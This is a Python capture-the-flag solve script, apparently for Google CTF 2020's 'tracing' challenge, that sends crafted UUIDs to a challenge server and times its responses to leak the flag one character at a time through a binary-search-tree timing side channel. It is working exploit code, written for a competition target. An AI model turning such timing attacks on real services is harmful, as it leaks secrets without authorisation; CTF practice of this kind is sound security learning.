from pwn import *
import time
import string
from tqdm import tqdm

IS_REMOTE = False
UUID_LEN = 16

def get_server_timing(uuids):
    """
    Send the UUIDs to the server, and measure the time it takes for the 
    server to search the UUID BinarySearchTree for the flag.
    """
    if IS_REMOTE:
        p = remote("tracing.2020.ctfcompetition.com", 1337)
    else:
        p = remote("localhost", 1337)

    for uuid in uuids:
        p.send(uuid)
    p.shutdown(direction="send")
    p.recv(4)
    start_time = time.time_ns()
    try:
        p.recv()
    except EOFError:
        end_time = time.time_ns()
    return (end_time - start_time)


def guess_next_flag_character(prefix):
    """
    Guesses the next character in the flag.
    """
    timings = dict()
    for char_byte in tqdm(sorted([b for b in string.printable.encode('ascii')])):
        # Generate guesses
        guesses = []
        guesses.append((prefix + bytes([char_byte - 1, 0xff, 0xff, 0x00])).ljust(UUID_LEN, b"\x00"))
        guesses.append((prefix + bytes([char_byte, 0xff, 0xff])).ljust(UUID_LEN, b"\x00"))
        for i in range(1, 2**12):
            guesses.append((prefix + bytes([char_byte]) + (0xffff - i).to_bytes(2, "big")).ljust(UUID_LEN, b"\x00"))

        # Get average timing
        total_timing = 0
        for _ in range(1):
            total_timing += get_server_timing(guesses)
        
        timings[char_byte] = total_timing
    
    max_char = max(timings, key=timings.get)
    print("Guess: {}".format(repr(chr(max_char))))
    return max_char


def main():
    # We know the flag starts with "CTF{" so no need to guess those characters.
    # Guess one character at a time, and add each character to the flag.
    current_flag = b"CTF"
    for i in range(10):
        current_flag += bytes([guess_next_flag_character(current_flag)])
        print(current_flag)


if __name__ == "__main__":
    main()

